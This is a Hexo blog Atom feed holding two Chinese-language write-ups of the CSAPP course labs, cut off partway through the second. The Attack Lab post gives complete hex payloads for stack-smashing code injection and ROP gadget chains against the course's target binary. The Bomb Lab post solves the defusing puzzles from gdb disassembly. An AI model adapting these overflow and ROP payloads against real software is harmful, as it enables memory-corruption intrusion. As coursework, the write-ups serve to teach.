<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SIO__Five</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-10T13:48:27.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>SIO__Five</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CMU15213：CSAPP 实验三：AttackLab</title>
    <link href="http://yoursite.com/2018/04/09/cmu15213-attacklab/"/>
    <id>http://yoursite.com/2018/04/09/cmu15213-attacklab/</id>
    <published>2018-04-09T14:33:00.000Z</published>
    <updated>2018-04-10T13:48:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>《深入理解计算机系统》的第三个实验，利用缓冲区溢出，实现：1.代码注入 2.当栈内无法插入可执行代码时，利用Gadget实现攻击。</p><h2 id="重要知识"><a href="#重要知识" class="headerlink" title="重要知识"></a>重要知识</h2><ol><li>栈底地址最大，栈顶地址最小。寄存器%rsp指向栈顶</li><li>%rdi 为函数调用的第一个参数。</li><li>我们可以通过Gets等函数，向栈里注入可执行代码，从而形成攻击。</li><li>另一种方式是return-oriented programming，在栈中插入连续的Gadget，从而应对栈中代码不可执行以及地址随机的问题。</li><li>利用GDB逐步跟踪，以及objdump反汇编得到函数的具体地址。</li></ol><h1 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>函数入口为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> val;</div><div class="line">val = getbuf();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>当使用getbuf的时候，会调用Gets。输入恰当的字符串，使得返回到touch1函数，从而实现第一个攻击。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">void touch1() &#123;</div><div class="line">vlevel = <span class="number">1</span>; <span class="regexp">/* Part of validation protocol */</span>printf(<span class="string">"Touch1!: You called touch1()\n"</span>);validate(<span class="number">1</span>);<span class="keyword">exit</span>(<span class="number">0</span>);&#125;</div></pre></td></tr></table></figure><p>使用GDB查看getbuf的汇编码，发现栈中为字符串开了40个字节，所以随便输入40个字节的字符，再把touch1的地址(0x4017c0)放在之后作为getbuf返回的地址即可。注意是little endian的规则，并且用0a作为字符串结尾。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </div><div class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></div><div class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></div><div class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </div><div class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </div><div class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">0</span>a<span class="comment">/* touch1的地址*/</span></div></pre></td></tr></table></figure><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>touch 2如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">void touch2(unsigned val) &#123;</div><div class="line">vlevel = <span class="number">2</span>;       <span class="regexp">/* Part of validation protocol */</span><span class="keyword">if</span> (val == cookie) &#123;printf(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);validate(<span class="number">2</span>); &#125;<span class="keyword">else</span>&#123;printf(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);fail(<span class="number">2</span>); &#125;<span class="keyword">exit</span>(<span class="number">0</span>); &#125;</div></pre></td></tr></table></figure><p>level 2 需要调用touch 2，并且传入一个与cookie相同的参数val。我们在栈中插入一段可执行代码，将cookie的值放入%edi寄存器，然后再调用touch 2即可。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">bf fa <span class="number">97</span> b9 <span class="number">59</span> c3 <span class="number">90</span> <span class="number">90</span> <span class="comment">/* 2. 0x5561dc78:mov $0x59b997fa, %edi  ret */</span></div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">/* 1. 跳转到栈中的可执行代码，地址为0x5561dc78。相当于ret，所以%rsp+8 */</span></div><div class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">0</span>a<span class="comment">/* 3. 执行完上述mov 操作，挑战到 touch2 */</span></div></pre></td></tr></table></figure><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>touch 3要传入一个字符串的首地址，和hexmatch里面的cookie做比较。所以传入的字符串必须包含cookie。由于touch 3还会调用hexmatch，hexmatch函数中有一个临时字符串，所以不能和传入的字符串冲突。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">90</span> <span class="comment">/* 2. 0x5561dc78:mov $0x5561dca8 %rdi */</span></div><div class="line"><span class="number">68</span> fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span><span class="comment">/* 3. pushq 0x4018fa */</span></div><div class="line">c3 <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span><span class="comment">/* 4. ret */</span></div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 1. 跳转到栈中可执行代码，地址为0x5561dc78, 并且%rsp+8 */</span> </div><div class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="comment">/* 0x5561dca8: cookie string address */</span></div></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>当栈中无法插入可执行代码时，我们能够通过一系列依次执行的Gadget来实现攻击。</p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>level 4通过组合popq %rax, movq %rax %rdi 将栈中的cookie先放到寄存器%rax中，再移动到%rdi中，作为参数传入touch 2</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </div><div class="line"><span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> <span class="number">65</span> </div><div class="line"><span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> <span class="number">66</span> </div><div class="line"><span class="number">67</span> <span class="number">67</span> <span class="number">67</span> <span class="number">67</span> <span class="number">67</span> <span class="number">67</span> <span class="number">67</span> <span class="number">67</span> </div><div class="line"><span class="number">68</span> <span class="number">68</span> <span class="number">68</span> <span class="number">68</span> <span class="number">68</span> <span class="number">68</span> <span class="number">68</span> <span class="number">68</span> </div><div class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">/* 1. jump to 0x4019ab, %rsp+8, 而0x4019ab的指令为 popq %rax */</span></div><div class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">/* 2. cookie为0x59b997fa, 将其pop到%rax中 */</span></div><div class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">/* 3. 执行完第一个Gadget，返回后跳到0x4019c5, 执行第二个：movq %rax, %rdi */</span></div><div class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">/* 4. 执行完返回，跳转到touch2： 0x4017ec */</span></div><div class="line"><span class="number">0</span>a</div></pre></td></tr></table></figure><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>level 5要通过Gadget将字符串的首地址传给touch3。 由于touch3调用了hexmatch，所以必须要将字符串放在栈底，才不会被其它修改。通过以下组合来实现</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></div><div class="line"><span class="number">11</span> <span class="number">11</span> <span class="number">11</span> <span class="number">11</span> <span class="number">11</span> <span class="number">11</span> <span class="number">11</span> <span class="number">11</span></div><div class="line"><span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span></div><div class="line"><span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span></div><div class="line"><span class="number">44</span> <span class="number">44</span> <span class="number">44</span> <span class="number">44</span> <span class="number">44</span> <span class="number">44</span> <span class="number">44</span> <span class="number">44</span></div><div class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 1. 第一个Gadget 0x401a60: movq %rsp %rax */</span></div><div class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 2. 第二个Gadget 0x4019a2: movq %rax %rdi */</span></div><div class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 3. 第三个Gadget 0x4019ab: popq %rax */</span></div><div class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 第三个Gadget中栈中取出到%rax的为常数 0x48 */</span></div><div class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 4. 第四个Gadget 0x4019dd: movl %eax %edx */</span></div><div class="line"><span class="number">34</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 5. 第五个Gadget 0x401a34: movl %edx %ecx */</span></div><div class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 6. 第六个Gadget 0x401a13: movl %ecx %esi */</span></div><div class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 7. 第七个Gadget 0x4019d6: lea (%rdi, %rsi, 1) %rax */</span></div><div class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 8. 第八个Gadget 0x4019dd: movq %rax %rdi */</span></div><div class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* 9. 将字符串的位置赋给%rdi后，调用touch3 */</span></div><div class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span><span class="comment">/* cookie */</span></div><div class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验内容&quot;&gt;&lt;a href=&quot;#实验内容&quot; class=&quot;headerlink&quot; title=&quot;实验内容&quot;&gt;&lt;/a&gt;实验内容&lt;/h1&gt;&lt;p&gt;《深入理解计算机系统》的第三个实验，利用缓冲区溢出，实现：1.代码注入 2.当栈内无法插入可执行代码时，利用Gadget实现
      
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="缓冲区溢出" scheme="http://yoursite.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
      <category term="代码注入" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ROP" scheme="http://yoursite.com/tags/ROP/"/>
    
      <category term="Gadget" scheme="http://yoursite.com/tags/Gadget/"/>
    
  </entry>
  
  <entry>
    <title>CMU15213：CSAPP 实验二：Bomb Lab</title>
    <link href="http://yoursite.com/2018/01/13/cmu15213-bomblab/"/>
    <id>http://yoursite.com/2018/01/13/cmu15213-bomblab/</id>
    <published>2018-01-13T14:33:00.000Z</published>
    <updated>2018-01-14T10:27:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>给定一个x86-64下可运行的可执行文件bomb，和对应的主程序代码bomb.c。用户需要输入6个字符串，一步步解开炸弹。如果输入的字符串不符合要求，炸弹就会爆炸。通过gdb对bomb进行调试，对可执行文件反汇编，从而解出对应的字符串。</p><p>为了防止bomb爆炸，先在explode_bomb处下上breakpoint，每次运行到此处就停止。</p><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><p>在phase_1出下断点，然后disas phase_1, 对应的汇编码如下。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function phase_1:</div><div class="line">   <span class="number">0</span>x0000000000400ee0 <span class="variable">&lt;+0&gt;</span>:sub    <span class="variable">$0x8</span>,%rsp</div><div class="line">   <span class="number">0</span>x0000000000400ee4 <span class="variable">&lt;+4&gt;</span>:mov    <span class="variable">$0x402400</span>,%esi</div><div class="line">   <span class="number">0</span>x0000000000400ee9 <span class="variable">&lt;+9&gt;</span>:callq  <span class="number">0</span>x401338 <span class="variable">&lt;strings_not_equal&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000400eee <span class="variable">&lt;+14&gt;</span>:test   %eax,%eax</div><div class="line">   <span class="number">0</span>x0000000000400ef0 <span class="variable">&lt;+16&gt;</span>:je     <span class="number">0</span>x400ef7 <span class="variable">&lt;phase_1+23&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000400ef2 <span class="variable">&lt;+18&gt;</span>:callq  <span class="number">0</span>x40143a <span class="variable">&lt;explode_bomb&gt;</span></div><div class="line">   <span class="number">0</span>x0000000000400ef7 <span class="variable">&lt;+23&gt;</span>:add    <span class="variable">$0x8</span>,%rsp</div><div class="line">   <span class="number">0</span>x0000000000400efb <span class="variable">&lt;+27&gt;</span>:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><p>发现调用了strings_not_equal函数，而我们输入的字符串地址存储在寄存器 %rdi 中，此外第二个参数在$rsi中。</p><p>查看0x402400处字符串，得到phase_1的答案。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s <span class="number">0x402400</span></div><div class="line"><span class="number">0x402400</span>:"Border relations with Canada have never been better."</div></pre></td></tr></table></figure><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>反汇编phase_2, 可以看到调用了read_six_numbers这个函数。</p><p>我们来看read_six_numbers这个函数，调用了sscanf，格式为sscanf(str, format_string)</p><p>而format_string的格式为</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="keyword">x</span>/<span class="keyword">s</span> <span class="number">0x4025c3</span></div><div class="line"><span class="number">0x4025c3</span>:<span class="string">"%d %d %d %d %d %d"</span></div></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(gdb) disas read_six_numbers </div><div class="line">Dump <span class="keyword">of</span> assembler code <span class="keyword">for</span> <span class="keyword">function</span> read_six_numbers:</div><div class="line">   <span class="number">0x000000000040145c</span> &lt;+<span class="number">0</span>&gt;:sub    $0x18,<span class="meta">%rsp</span></div><div class="line">   <span class="number">0x0000000000401460</span> &lt;+<span class="number">4</span>&gt;:mov    <span class="meta">%rsi</span>,<span class="meta">%rdx</span></div><div class="line">   <span class="number">0x0000000000401463</span> &lt;+<span class="number">7</span>&gt;:lea    <span class="number">0x4</span>(<span class="meta">%rsi</span>),<span class="meta">%rcx</span></div><div class="line">   <span class="number">0x0000000000401467</span> &lt;+<span class="number">11</span>&gt;:lea    <span class="number">0x14</span>(<span class="meta">%rsi</span>),<span class="meta">%rax</span></div><div class="line">   <span class="number">0x000000000040146b</span> &lt;+<span class="number">15</span>&gt;:mov    <span class="meta">%rax</span>,<span class="number">0x8</span>(<span class="meta">%rsp</span>)</div><div class="line">   <span class="number">0x0000000000401470</span> &lt;+<span class="number">20</span>&gt;:lea    <span class="number">0x10</span>(<span class="meta">%rsi</span>),<span class="meta">%rax</span></div><div class="line">   <span class="number">0x0000000000401474</span> &lt;+<span class="number">24</span>&gt;:mov    <span class="meta">%rax</span>,(<span class="meta">%rsp</span>)</div><div class="line">   <span class="number">0x0000000000401478</span> &lt;+<span class="number">28</span>&gt;:lea    <span class="number">0xc</span>(<span class="meta">%rsi</span>),<span class="meta">%r9</span></div><div class="line">   <span class="number">0x000000000040147c</span> &lt;+<span class="number">32</span>&gt;:lea    <span class="number">0x8</span>(<span class="meta">%rsi</span>),<span class="meta">%r8</span></div><div class="line">   <span class="number">0x0000000000401480</span> &lt;+<span class="number">36</span>&gt;:mov    $0x4025c3,<span class="meta">%esi</span></div><div class="line">   <span class="number">0x0000000000401485</span> &lt;+<span class="number">41</span>&gt;:mov    $0x0,<span class="meta">%eax</span></div><div class="line">   <span class="number">0x000000000040148a</span> &lt;+<span class="number">46</span>&gt;:callq  <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</div><div class="line">   <span class="number">0x000000000040148f</span> &lt;+<span class="number">51</span>&gt;:cmp    $0x5,<span class="meta">%eax</span></div><div class="line">   <span class="number">0x0000000000401492</span> &lt;+<span class="number">54</span>&gt;:jg     <span class="number">0x401499</span> &lt;read_six_numbers+<span class="number">61</span>&gt;</div><div class="line">   <span class="number">0x0000000000401494</span> &lt;+<span class="number">56</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000401499</span> &lt;+<span class="number">61</span>&gt;:add    $0x18,<span class="meta">%rsp</span></div><div class="line">   <span class="number">0x000000000040149d</span> &lt;+<span class="number">65</span>&gt;:retq   </div><div class="line">End <span class="keyword">of</span> assembler dump.</div></pre></td></tr></table></figure><p>可以看到read_six_numbers 从字符串中读入6个数字，并且将结果放在了栈中。</p><p>之后看后续代码，其实就是保证第一个数字是1，后面的数字是前一个数字的两倍关系。所以最后的答案为 1 2 4 8 16 32</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">(gdb) disas phase_2</div><div class="line">Dump of assembler code for function phase_2:</div><div class="line">   <span class="number">0x0000000000400efc</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %rbp</div><div class="line">   <span class="number">0x0000000000400efd</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">push</span>   %rbx</div><div class="line">   <span class="number">0x0000000000400efe</span> &lt;+<span class="number">2</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</div><div class="line">   <span class="number">0x0000000000400f02</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">mov</span>    %rsp,%rsi</div><div class="line">   <span class="number">0x0000000000400f05</span> &lt;+<span class="number">9</span>&gt;:callq  <span class="number">0x40145c</span> &lt;read_six_numbers&gt;</div><div class="line">   <span class="number">0x0000000000400f0a</span> &lt;+<span class="number">14</span>&gt;:cmpl   <span class="number">$0</span>x1,(%rsp)</div><div class="line">   <span class="number">0x0000000000400f0e</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400f30</span> &lt;phase_2+<span class="number">52</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f10</span> &lt;+<span class="number">20</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000400f15</span> &lt;+<span class="number">25</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f30</span> &lt;phase_2+<span class="number">52</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f17</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">mov</span>    -<span class="number">0x4</span>(%rbx),%eax</div><div class="line">   <span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    %eax,%eax</div><div class="line">   <span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    %eax,(%rbx)</div><div class="line">   <span class="number">0x0000000000400f1e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400f25</span> &lt;phase_2+<span class="number">41</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f20</span> &lt;+<span class="number">36</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</div><div class="line">   <span class="number">0x0000000000400f25</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x4,%rbx</div><div class="line">   <span class="number">0x0000000000400f29</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">cmp</span>    %rbp,%rbx</div><div class="line">   <span class="number">0x0000000000400f2c</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x400f17</span> &lt;phase_2+<span class="number">27</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f2e</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f3c</span> &lt;phase_2+<span class="number">64</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f30</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x4</span>(%rsp),%rbx</div><div class="line">   <span class="number">0x0000000000400f35</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rbp</div><div class="line">   <span class="number">0x0000000000400f3a</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400f17</span> &lt;phase_2+<span class="number">27</span>&gt;</div><div class="line">   <span class="number">0x0000000000400f3c</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</div><div class="line">   <span class="number">0x0000000000400f40</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">pop</span>    %rbx</div><div class="line">   <span class="number">0x0000000000400f41</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">pop</span>    %rbp</div><div class="line">   <span class="number">0x0000000000400f42</span> &lt;+<span class="number">70</span>&gt;:retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>观察phase_3,同样调用了sscanf函数，而对应的format_string为”%d %d”。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">(gdb) disas phase_3 </div><div class="line">Dump of assembler code for function phase_3:</div><div class="line">   <span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</div><div class="line">   <span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</div><div class="line">   <span class="number">0x0000000000400f4c</span> &lt;+<span 